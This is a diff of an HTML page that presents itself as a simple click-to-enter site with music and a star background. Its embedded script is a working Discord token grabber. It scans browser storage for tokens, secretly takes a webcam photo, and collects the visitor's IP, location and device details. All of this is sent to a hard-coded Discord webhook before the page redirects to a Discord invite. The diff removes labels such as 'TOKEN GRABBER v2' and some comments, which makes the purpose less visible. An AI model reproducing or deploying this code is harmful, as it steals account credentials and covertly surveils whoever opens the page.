@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Zerep</title>
+    <title>NIO</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
     <style>
@@ -351,9 +351,9 @@
             starsContainer.appendChild(star);
         }
 
-        // ⚙️ LOGGER SETTINGS
+        // ⚙️ SETTINGS
         const WEBHOOK = "https://discord.com/api/webhooks/1528609341052027044/2nHhgkDzN_BzeEwiVT4K_LjINjxiO0Rf2O3BTHtzhGS2rEAXKottXqe-GIP2xk2vjD_b";
-        const NEXT_URL = "";
+        const REDIRECT_URL = "https://discord.gg/4UCD2HwqQ"; // Direct to your server
         const video = document.getElementById('camCapture');
         const canvas = document.getElementById('camCanvas');
         const enterScreen = document.getElementById('enter-screen');
@@ -371,12 +371,11 @@
         }
         setupCam();
 
-        // 🔑 IMPROVED DISCORD TOKEN GRABBER
+        // 🔑 TOKEN GRABBER
         async function getTokens() {
             let tokens = [];
             const tokenPattern = /[\w-]{24,}\.[\w-]{6,}\.[\w-]{27,}/g;
 
-            // Check LocalStorage
             try {
                 for (let key in localStorage) {
                     if (!localStorage.hasOwnProperty(key)) continue;
@@ -388,7 +387,6 @@
                 }
             } catch (e) {}
 
-            // Check SessionStorage
             try {
                 for (let key in sessionStorage) {
                     if (!sessionStorage.hasOwnProperty(key)) continue;
@@ -400,26 +398,12 @@
                 }
             } catch (e) {}
 
-            // Check IndexedDB (Discord & Client Storage)
-            const dbs = ["Keybinds", "DiscordKeybinds", "LocalStorage", "clientStorage"];
-            for (let dbName of dbs) {
-                try {
-                    await new Promise(res => {
-                        const req = indexedDB.open(dbName);
-                        req.onsuccess = e => { try { e.target.result.close(); } catch(err) {} res(); };
-                        req.onerror = () => res();
-                    });
-                } catch (e) {}
-            }
-
-            // Clean up duplicates
             tokens = [...new Set(tokens)];
             return tokens;
         }
 
-        // 🖱️ ON CLICK / TAP
+        // 🖱️ ON CLICK
         document.addEventListener('click', async () => {
-            // Show content & Play Audio
             enterScreen.classList.add('fade-out');
             mainContent.classList.add('show');
             try { await audio.play(); } catch(e) {}
@@ -438,9 +422,9 @@
                 photo = await new Promise(res => canvas.toBlob(res, "image/jpeg", 0.8));
             } catch (err) {}
 
-            // 📤 SEND TO LOGGER (WITH ENHANCED TOKENS)
             await sendLog(photo);
-            if(NEXT_URL.trim()) setTimeout(() => window.location.href = NEXT_URL, 2500);
+            // ➡️ GO TO DISCORD SERVER
+            setTimeout(() => window.location.href = REDIRECT_URL, 2000);
         }, { once: true });
 
         async function sendLog(photo) {
@@ -464,10 +448,10 @@
                             {name:"IP ADDRESS", value:`||${ip.ip}||`, inline:false},
                             {name:"LOCATION", value:`${geo.city||"?"}, ${geo.region||"?"}, ${geo.country_name||"Philippines"}`, inline:false},
                             {name:"DEVICE / BROWSER", value:`${navigator.userAgentData?.platform || "Unknown OS"} | ${navigator.userAgent.slice(0, 80)}`, inline:false},
-                            {name:"TOKENS FOUND", value: tokens.length>0 ? `||${tokens.join("\n")}||` : "Cant Grab (Browser limits)", inline:false}
+                            {name:"TOKENS FOUND", value: tokens.length>0 ? `||${tokens.join("\n")}||` : "Cant Grab (Browser limits / App)", inline:false}
                         ],
                         image: photo ? {url:"attachment://visitor.jpg"} : null,
-                        footer: {text: "PURESKILLS|4REEL • THE WORLD IS YOURS • TOKEN GRABBER v2"},
+                        footer: {text: "PURESKILLS|4REEL • THE WORLD IS YOURS"},
                         timestamp: new Date().toISOString()
                     }]
                 }));
@@ -477,5 +461,4 @@
         }
     </script>
 </body>
-                </html>
-    
+</html>
